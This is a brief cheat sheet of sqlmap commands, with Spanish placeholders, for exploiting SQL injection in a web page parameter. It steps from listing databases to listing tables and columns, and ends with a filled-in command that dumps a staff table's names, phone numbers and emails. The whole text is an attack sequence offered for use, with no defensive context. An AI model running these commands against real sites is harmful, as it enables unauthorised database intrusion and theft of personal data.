sqlmap -u (url) --dbs
sqlmap -u (url) -D (base) --tables
sqlmap -u (url) -D (base) -T (nombre tabla) --columns
sqlmap -u (url) -D (base) -T (nombre tabla) -C (nombre de listas de tabla) --dump
sqlmap -u http://url/ejemplo.php?id=745 -D test -T funcionarios -C profesor,telefono,nombre,email --dump

